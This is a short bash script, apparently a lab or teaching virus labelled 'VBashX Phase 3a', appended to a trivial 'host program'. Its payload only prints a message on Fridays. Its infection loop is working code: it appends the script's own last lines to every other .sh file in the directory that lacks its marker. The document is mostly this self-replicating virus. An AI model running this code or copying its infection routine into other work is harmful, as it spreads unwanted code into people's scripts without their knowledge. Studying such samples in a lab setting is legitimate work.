#!/bin/bash
echo "I am the host program"
# --- VBashX Phase 3a --- VBX_7k9Pz
MARKER="VBX_7k9Pz"
VIRUS_SIZE=15
# Payload: triggered on Friday (day 5)
if [ "$(date +%u)" -eq 5 ]; then
    echo "[VBashX] PAYLOAD ACTIVATED - Today is Friday!"
fi
# Infection phase
for f in *.sh; do
    if [ "$(basename "$f")" != "$(basename "$0")" ]; then
        if [ -z "$(grep "$MARKER" "$f")" ]; then
            tail -n $VIRUS_SIZE "$0" >> "$f"
        fi
    fi
done
